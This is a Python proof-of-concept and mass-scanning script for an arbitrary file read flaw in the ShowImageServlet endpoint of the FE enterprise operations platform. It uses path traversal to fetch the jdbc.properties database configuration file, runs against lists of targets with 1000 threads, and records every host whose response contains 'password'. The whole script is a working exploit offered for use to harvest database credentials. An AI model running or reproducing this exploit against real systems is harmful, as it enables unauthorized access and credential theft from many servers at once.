import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def main():
    banner()
    parser = argparse.ArgumentParser(description="飞企互联-FE企业运营管理平台ShowImageServlet接口存在任意文件读取漏洞")
    parser.add_argument('-u','--url',help="please input your url")
    parser.add_argument('-f','--file',help="please input your file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file,'r',encoding='utf-8') as fp:
            fo = fp.readlines()
            url_list = []
            for i in fo:
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(1000)
        mp.map(poc,url_list)
        mp.close()
        mp.join()

def banner():
    banner = '''
     __                            __                      __  __ 
    |  \                          |  \                    |  \|  \
    | $$____    ______    _______ | $$   __  __   __   __  \$$ \$$
    | $$    \  |      \  /       \| $$  /  \|  \ |  \ |  \|  \|  \
    | $$$$$$$\  \$$$$$$\|  $$$$$$$| $$_/  $$| $$ | $$ | $$| $$| $$
    | $$  | $$ /      $$| $$      | $$   $$ | $$ | $$ | $$| $$| $$
    | $$  | $$|  $$$$$$$| $$_____ | $$$$$$\ | $$_/ $$_/ $$| $$| $$
    | $$  | $$ \$$    $$ \$$     \| $$  \$$\ \$$   $$   $$| $$| $$
     \$$   \$$  \$$$$$$$  \$$$$$$$ \$$   \$$  \$$$$$\$$$$  \$$ \$$
                                                auther:lllo    
    '''
    print(banner)
def poc(target):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121',
        'Accept': '*/*',
        'Connection': 'Keep-Alive'
    }
    proxies = {
        'http':'127.0.0.1:8080',
        'https':'127.0.0.1:8080'
    }
    url = target+'/servlet/ShowImageServlet?imagePath=../web/fe.war/WEB-INF/classes/jdbc.properties&print'

    try:
        res = requests.get(url=url,headers=headers,timeout=5,proxies=proxies).text
        if "password" in res:
            with open('result.txt','a') as fp1:
                fp1.write(f"[+]{target} is veriable"+'\n')
        else:
            print(f'[-]{target} is not veriable')
    except:
        print(f'[*]{target} server erro')

if __name__ =='__main__':
    main()